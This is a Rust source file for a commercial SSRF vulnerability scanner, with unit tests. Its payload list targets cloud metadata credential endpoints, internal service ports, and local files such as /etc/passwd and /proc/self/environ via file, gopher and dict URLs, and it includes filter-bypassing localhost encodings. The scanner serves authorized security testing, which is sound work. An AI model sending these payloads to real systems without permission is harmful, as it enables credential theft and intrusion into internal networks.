// Copyright (c) 2025 Bountyy Oy. All rights reserved.
// This software is proprietary and confidential.

/**
 * Bountyy Oy - SSRF (Server-Side Request Forgery) Scanner
 * Tests for SSRF vulnerabilities using comprehensive payload set
 *
 * @copyright 2025 Bountyy Oy
 * @license Proprietary - Enterprise Edition
 */

use crate::http_client::{HttpClient, HttpResponse};
use crate::types::{Confidence, ScanConfig, Severity, Vulnerability};
use anyhow::Result;
use std::sync::Arc;
use tracing::{debug, info, warn};

pub struct SsrfScanner {
    http_client: Arc<HttpClient>,
}

impl SsrfScanner {
    pub fn new(http_client: Arc<HttpClient>) -> Self {
        Self { http_client }
    }

    /// Scan a parameter for SSRF vulnerabilities
    pub async fn scan_parameter(
        &self,
        base_url: &str,
        parameter: &str,
        _config: &ScanConfig,
    ) -> Result<(Vec<Vulnerability>, usize)> {
        // ============================================================
        // MANDATORY AUTHORIZATION CHECK - CANNOT BE BYPASSED
        // ============================================================
        // Defense in depth: verify both license and signing authorization
        if !crate::license::verify_scan_authorized() {
            return Ok((Vec::new(), 0));
        }
        if !crate::signing::is_scan_authorized() {
            tracing::warn!("SSRF scan blocked: No valid scan authorization");
            return Ok((Vec::new(), 0));
        }

        info!("[SSRF] Scanning parameter: {}", parameter);

        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        // Get baseline response first - critical for avoiding false positives
        let baseline = match self.http_client.get(base_url).await {
            Ok(response) => response,
            Err(e) => {
                debug!("Failed to get baseline for SSRF testing: {}", e);
                return Ok((Vec::new(), 0));
            }
        };

        let payloads = self.generate_ssrf_payloads();

        for payload in &payloads {
            tests_run += 1;

            let test_url = if base_url.contains('?') {
                format!("{}&{}={}", base_url, parameter, urlencoding::encode(payload))
            } else {
                format!("{}?{}={}", base_url, parameter, urlencoding::encode(payload))
            };

            debug!("Testing SSRF payload: {} -> {}", parameter, payload);

            match self.http_client.get(&test_url).await {
                Ok(response) => {
                    if let Some(vuln) = self.analyze_ssrf_response(&response, payload, parameter, &test_url, &baseline) {
                        info!("[ALERT] SSRF vulnerability detected in parameter '{}'", parameter);
                        vulnerabilities.push(vuln);
                        break; // Found vulnerability, no need to continue
                    }
                }
                Err(e) => {
                    debug!("SSRF test error: {}", e);
                    // Timeouts or network errors might indicate blind SSRF
                    if payload.contains("169.254.169.254") || payload.contains("metadata") {
                        warn!("[WARNING]  Possible blind SSRF - request to metadata service failed");
                    }
                }
            }
        }

        info!(
            "[SUCCESS] [SSRF] Completed {} tests on parameter '{}', found {} vulnerabilities",
            tests_run,
            parameter,
            vulnerabilities.len()
        );

        Ok((vulnerabilities, tests_run))
    }

    /// Generate comprehensive SSRF payloads
    fn generate_ssrf_payloads(&self) -> Vec<String> {
        vec![
            // AWS EC2 Metadata (IMDSv1)
            "http://169.254.169.254/latest/meta-data/".to_string(),
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/".to_string(),
            "http://169.254.169.254/latest/user-data/".to_string(),
            "http://169.254.169.254/latest/dynamic/instance-identity/document".to_string(),

            // AWS IMDSv2 (requires token, but worth testing)
            "http://169.254.169.254/latest/api/token".to_string(),

            // GCP Metadata
            "http://metadata.google.internal/computeMetadata/v1/".to_string(),
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token".to_string(),
            "http://metadata/computeMetadata/v1/".to_string(),

            // Azure Metadata
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01".to_string(),
            "http://169.254.169.254/metadata/identity/oauth2/token".to_string(),

            // DigitalOcean Metadata
            "http://169.254.169.254/metadata/v1.json".to_string(),

            // Alibaba Cloud Metadata
            "http://100.100.100.200/latest/meta-data/".to_string(),

            // Internal network probing - Common services
            "http://localhost:80".to_string(),
            "http://127.0.0.1:22".to_string(),
            "http://127.0.0.1:3306".to_string(),      // MySQL
            "http://127.0.0.1:5432".to_string(),      // PostgreSQL
            "http://127.0.0.1:6379".to_string(),      // Redis
            "http://127.0.0.1:27017".to_string(),     // MongoDB
            "http://127.0.0.1:9200".to_string(),      // Elasticsearch
            "http://127.0.0.1:8080".to_string(),      // Common app port
            "http://127.0.0.1:8000".to_string(),      // Common dev port

            // Alternative localhost representations
            "http://0.0.0.0:80".to_string(),
            "http://[::1]:80".to_string(),            // IPv6 localhost
            "http://127.1:80".to_string(),            // Shortened localhost
            "http://0177.0.0.1:80".to_string(),       // Octal representation
            "http://2130706433:80".to_string(),       // Decimal representation

            // File protocol (local file access)
            "file:///etc/passwd".to_string(),
            "file:///etc/hosts".to_string(),
            "file:///proc/self/environ".to_string(),
            "file:///c:/windows/win.ini".to_string(),

            // Gopher protocol (can talk to various services)
            "gopher://127.0.0.1:25/".to_string(),     // SMTP
            "gopher://127.0.0.1:6379/_INFO".to_string(), // Redis

            // Dict protocol
            "dict://127.0.0.1:11211/".to_string(),    // Memcached

            // LDAP protocol
            "ldap://127.0.0.1:389/".to_string(),

            // FTP protocol
            "ftp://127.0.0.1:21".to_string(),

            // Internal network ranges (RFC 1918)
            "http://10.0.0.1".to_string(),
            "http://172.16.0.1".to_string(),
            "http://192.168.0.1".to_string(),
            "http://192.168.1.1".to_string(),

            // DNS rebinding prevention bypass
            "http://localtest.me".to_string(),        // Resolves to 127.0.0.1
            "http://localhost.localdomain".to_string(),

            // Cloud service endpoints
            "http://kubernetes.default.svc/api/v1/namespaces/default/pods".to_string(),
            "http://consul.service.consul:8500/v1/catalog/services".to_string(),
        ]
    }

    /// Analyze HTTP response for SSRF indicators
    fn analyze_ssrf_response(
        &self,
        response: &HttpResponse,
        payload: &str,
        parameter: &str,
        test_url: &str,
        baseline: &HttpResponse,
    ) -> Option<Vulnerability> {
        let body_lower = response.body.to_lowercase();
        let baseline_lower = baseline.body.to_lowercase();

        // Critical: Check if response is significantly different from baseline
        // If response is identical, the application ignores the parameter (not SSRF)
        let response_changed = response.body != baseline.body;
        let size_diff = (response.body.len() as i64 - baseline.body.len() as i64).abs();
        let significant_change = size_diff > 50 || response.status_code != baseline.status_code;

        // AWS Metadata indicators - must be specific to avoid false positives
        // Note: "token" alone is too generic (React/Next.js uses tokens everywhere)
        let aws_indicators = [
            "ami-id",
            "instance-id",
            "placement/availability-zone",
            "iam/security-credentials",
            "accesskeyid",
            "secretaccesskey",
            "iam-info",
            "public-ipv4",
            "local-ipv4",
            "public-hostname",
            "instance-type",
            "security-groups",
            "meta-data",           // AWS specific path
            "dynamic/instance-identity",
        ];

        // GCP Metadata indicators - more specific
        let gcp_indicators = [
            "computemetadata/v1",
            "service-accounts/default",
            "project-id",
            "instance/zone",
            "instance/machine-type",
            "instance/network-interfaces",
            "attributes/",
        ];

        // Azure Metadata indicators - more specific
        let azure_indicators = [
            "subscriptionid",
            "resourcegroupname",
            "vmid",
            "vmsize",
            "vmscalesetname",
            "platformfaultdomain",
            "azureenvironment",
            "location",   // combined with Azure-specific context
        ];

        // Internal service indicators
        let internal_indicators = [
            "root:x:",              // /etc/passwd
            "ssh-",                 // SSH banner
            "mysql",                // MySQL banner
            "redis_version",        // Redis INFO
            "elasticsearch",        // Elasticsearch
            "mongodb",              // MongoDB
            "[mail]",               // Windows win.ini
            "environment",          // Linux env vars
        ];

        // Check for AWS metadata - must be NEW indicator (not in baseline) AND response changed
        for indicator in &aws_indicators {
            if body_lower.contains(indicator) && !baseline_lower.contains(indicator) {
                // Extra validation: only report if response actually changed
                if response_changed || significant_change {
                    return Some(self.create_vulnerability(
                        parameter,
                        payload,
                        test_url,
                        "AWS EC2 Metadata Service accessible - credentials may be exposed",
                        Confidence::High,
                        format!("Response contains NEW AWS metadata indicator: {} (not in baseline)", indicator),
                    ));
                }
            }
        }

        // Check for GCP metadata - must be NEW indicator AND response changed
        for indicator in &gcp_indicators {
            if body_lower.contains(indicator) && !baseline_lower.contains(indicator) {
                if response_changed || significant_change {
                    return Some(self.create_vulnerability(
                        parameter,
                        payload,
                        test_url,
                        "GCP Metadata Service accessible - credentials may be exposed",
                        Confidence::High,
                        format!("Response contains NEW GCP metadata indicator: {} (not in baseline)", indicator),
                    ));
                }
            }
        }

        // Check for Azure metadata - must be NEW indicator AND response changed
        for indicator in &azure_indicators {
            if body_lower.contains(indicator) && !baseline_lower.contains(indicator) {
                if response_changed || significant_change {
                    return Some(self.create_vulnerability(
                        parameter,
                        payload,
                        test_url,
                        "Azure Metadata Service accessible - instance information exposed",
                        Confidence::High,
                        format!("Response contains NEW Azure metadata indicator: {} (not in baseline)", indicator),
                    ));
                }
            }
        }

        // Check for internal service responses - must be NEW indicator AND response changed
        for indicator in &internal_indicators {
            if body_lower.contains(indicator) && !baseline_lower.contains(indicator) {
                if response_changed || significant_change {
                    return Some(self.create_vulnerability(
                        parameter,
                        payload,
                        test_url,
                        "Internal service accessible - network segmentation bypass",
                        Confidence::High,
                        format!("Response contains NEW internal service indicator: {} (not in baseline)", indicator),
                    ));
                }
            }
        }

        // Check response size ONLY for metadata endpoints - very small responses might indicate SSRF
        // But ONLY if response is significantly different from baseline
        if (payload.contains("169.254.169.254") || payload.contains("metadata")) &&
           response.body.len() < 50 && response.body.len() > 0 &&
           significant_change {
            // Small response might be metadata - but only report if it changed
            if response.status_code == 200 && response.body != baseline.body {
                return Some(self.create_vulnerability(
                    parameter,
                    payload,
                    test_url,
                    "Suspicious small response from metadata endpoint",
                    Confidence::Medium,
                    format!("Response size: {} bytes (significantly different from baseline)", response.body.len()),
                ));
            }
        }

        // DON'T report based solely on status code - this causes false positives
        // A normal web app will return 200 for ANY URL parameter
        // We need ACTUAL metadata content or internal service indicators
        // AND the response must differ from baseline

        None
    }

    /// Create a vulnerability record
    fn create_vulnerability(
        &self,
        parameter: &str,
        payload: &str,
        test_url: &str,
        description: &str,
        confidence: Confidence,
        evidence: String,
    ) -> Vulnerability {
        Vulnerability {
            id: format!("ssrf_{}", uuid::Uuid::new_v4().to_string()),
            vuln_type: "Server-Side Request Forgery (SSRF)".to_string(),
            severity: Severity::Critical,
            confidence,
            category: "SSRF".to_string(),
            url: test_url.to_string(),
            parameter: Some(parameter.to_string()),
            payload: payload.to_string(),
            description: format!(
                "SSRF vulnerability detected in parameter '{}'. {}. The application makes requests to attacker-controlled URLs, potentially exposing cloud metadata, internal services, or sensitive files.",
                parameter, description
            ),
            evidence: Some(evidence),
            cwe: "CWE-918".to_string(),
            cvss: 9.1,
            verified: true,
            false_positive: false,
            remediation: r#"IMMEDIATE ACTION REQUIRED:
1. Validate and sanitize all URLs from user input
2. Use allowlists for permitted domains/IPs (not denylists)
3. Disable unnecessary URL schemes (file://, gopher://, dict://, ldap://)
4. Implement network segmentation to restrict outbound connections
5. Use cloud metadata service IMDSv2 (requires session tokens)
6. Block access to metadata endpoints (169.254.169.254, metadata.google.internal, etc.)
7. Consider using a proxy service that validates outbound requests"#.to_string(),
            discovered_at: chrono::Utc::now().to_rfc3339(),
        }
    }
}

// UUID generation helper (same as other scanners)
mod uuid {
    use rand::Rng;

    pub struct Uuid;

    impl Uuid {
        pub fn new_v4() -> Self {
            Self
        }

        pub fn to_string(&self) -> String {
            let mut rng = rand::rng();
            format!(
                "{:08x}-{:04x}-{:04x}-{:04x}-{:012x}",
                rng.random::<u32>(),
                rng.random::<u16>(),
                rng.random::<u16>(),
                rng.random::<u16>(),
                rng.random::<u64>() & 0xffffffffffff
            )
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_ssrf_payload_generation() {
        let scanner = SsrfScanner::new(Arc::new(
            HttpClient::new(5, 2).unwrap()
        ));

        let payloads = scanner.generate_ssrf_payloads();

        // Should have comprehensive payload set
        assert!(payloads.len() >= 40, "Should have at least 40 SSRF payloads");

        // Check for critical payloads
        assert!(payloads.iter().any(|p| p.contains("169.254.169.254")), "Missing AWS metadata");
        assert!(payloads.iter().any(|p| p.contains("metadata.google.internal")), "Missing GCP metadata");
        assert!(payloads.iter().any(|p| p.contains("file://")), "Missing file:// protocol");
        assert!(payloads.iter().any(|p| p.contains("gopher://")), "Missing gopher:// protocol");
    }

    #[test]
    fn test_aws_metadata_detection() {
        let scanner = SsrfScanner::new(Arc::new(
            HttpClient::new(5, 2).unwrap()
        ));

        // Normal baseline response (no AWS metadata)
        let baseline = HttpResponse {
            status_code: 200,
            body: "<html><body>Normal web page</body></html>".to_string(),
            headers: std::collections::HashMap::new(),
            duration_ms: 100,
        };

        // Response with AWS metadata (different from baseline)
        let response = HttpResponse {
            status_code: 200,
            body: r#"{"ami-id": "ami-12345", "instance-id": "i-abcdef"}"#.to_string(),
            headers: std::collections::HashMap::new(),
            duration_ms: 100,
        };

        let result = scanner.analyze_ssrf_response(
            &response,
            "http://169.254.169.254/latest/meta-data/",
            "url",
            "http://example.com?url=http://169.254.169.254/latest/meta-data/",
            &baseline
        );

        assert!(result.is_some(), "Should detect AWS metadata");
        let vuln = result.unwrap();
        assert_eq!(vuln.severity, Severity::Critical);
        assert_eq!(vuln.confidence, Confidence::High);
    }

    #[test]
    fn test_gcp_metadata_detection() {
        let scanner = SsrfScanner::new(Arc::new(
            HttpClient::new(5, 2).unwrap()
        ));

        let baseline = HttpResponse {
            status_code: 200,
            body: "<html><body>Normal web page</body></html>".to_string(),
            headers: std::collections::HashMap::new(),
            duration_ms: 100,
        };

        let response = HttpResponse {
            status_code: 200,
            body: r#"{"project-id": "my-project", "instance/zone": "us-central1-a"}"#.to_string(),
            headers: std::collections::HashMap::new(),
            duration_ms: 100,
        };

        let result = scanner.analyze_ssrf_response(
            &response,
            "http://metadata.google.internal/computeMetadata/v1/",
            "url",
            "http://example.com?url=http://metadata.google.internal/",
            &baseline
        );

        assert!(result.is_some(), "Should detect GCP metadata");
    }

    #[test]
    fn test_internal_service_detection() {
        let scanner = SsrfScanner::new(Arc::new(
            HttpClient::new(5, 2).unwrap()
        ));

        let baseline = HttpResponse {
            status_code: 200,
            body: "<html><body>Normal web page</body></html>".to_string(),
            headers: std::collections::HashMap::new(),
            duration_ms: 100,
        };

        let response = HttpResponse {
            status_code: 200,
            body: "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin".to_string(),
            headers: std::collections::HashMap::new(),
            duration_ms: 100,
        };

        let result = scanner.analyze_ssrf_response(
            &response,
            "file:///etc/passwd",
            "url",
            "http://example.com?url=file:///etc/passwd",
            &baseline
        );

        assert!(result.is_some(), "Should detect /etc/passwd access");
    }

    #[test]
    fn test_no_false_positive() {
        let scanner = SsrfScanner::new(Arc::new(
            HttpClient::new(5, 2).unwrap()
        ));

        // Baseline and response are identical - app ignores the parameter
        let baseline = HttpResponse {
            status_code: 200,
            body: "<html><body>Normal web page content</body></html>".to_string(),
            headers: std::collections::HashMap::new(),
            duration_ms: 100,
        };

        let response = HttpResponse {
            status_code: 200,
            body: "<html><body>Normal web page content</body></html>".to_string(),
            headers: std::collections::HashMap::new(),
            duration_ms: 100,
        };

        let result = scanner.analyze_ssrf_response(
            &response,
            "http://example.com",
            "url",
            "http://test.com?url=http://example.com",
            &baseline
        );

        assert!(result.is_none(), "Should not report false positive when response equals baseline");
    }

    #[test]
    fn test_no_false_positive_on_react_tokens() {
        let scanner = SsrfScanner::new(Arc::new(
            HttpClient::new(5, 2).unwrap()
        ));

        // Both baseline and response contain "token" (React/Next.js app)
        // Should NOT be reported as SSRF
        let baseline = HttpResponse {
            status_code: 200,
            body: r#"<html><script>window.__NEXT_DATA__={"props":{"token":"abc123"}}</script></html>"#.to_string(),
            headers: std::collections::HashMap::new(),
            duration_ms: 100,
        };

        let response = HttpResponse {
            status_code: 200,
            body: r#"<html><script>window.__NEXT_DATA__={"props":{"token":"abc123"}}</script></html>"#.to_string(),
            headers: std::collections::HashMap::new(),
            duration_ms: 100,
        };

        let result = scanner.analyze_ssrf_response(
            &response,
            "http://169.254.169.254/latest/meta-data/",
            "url",
            "http://test.com?url=http://169.254.169.254/",
            &baseline
        );

        assert!(result.is_none(), "Should not report false positive on React apps with token in baseline");
    }
}
